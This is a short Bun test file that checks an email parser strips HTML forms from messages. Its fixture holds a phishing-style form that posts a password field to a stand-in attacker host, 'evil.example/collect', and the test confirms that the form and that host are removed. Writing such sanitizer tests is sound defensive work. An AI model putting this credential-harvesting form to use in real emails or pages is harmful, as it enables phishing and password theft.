import { describe, expect, test } from 'bun:test';
import { parseEmlBytes } from '../../lib/mail/mail-parse';

function eml(html: string): Buffer {
    return Buffer.from(
        [
            'From: a@example.com',
            'To: b@example.com',
            'Subject: t',
            'Content-Type: text/html; charset=utf-8',
            '',
            html,
        ].join('\r\n'),
    );
}

describe('parseEmlBytes html sanitizing', () => {
    test('a <form> is dropped while its visible content and links survive', async () => {
        const bytes = eml(
            '<p>Hi</p><form action="https://evil.example/collect" method="post"><input name="password"><button>Sign in</button></form><a href="https://ok.example" target="_blank">ok</a>',
        );
        const mail = await parseEmlBytes('m1', 'INBOX', bytes, bytes.length);
        expect(mail.html).not.toContain('<form');
        expect(mail.html).not.toContain('evil.example');
        expect(mail.html).toContain('<p>Hi</p>');
        expect(mail.html).toContain('target="_blank"');
    });
});
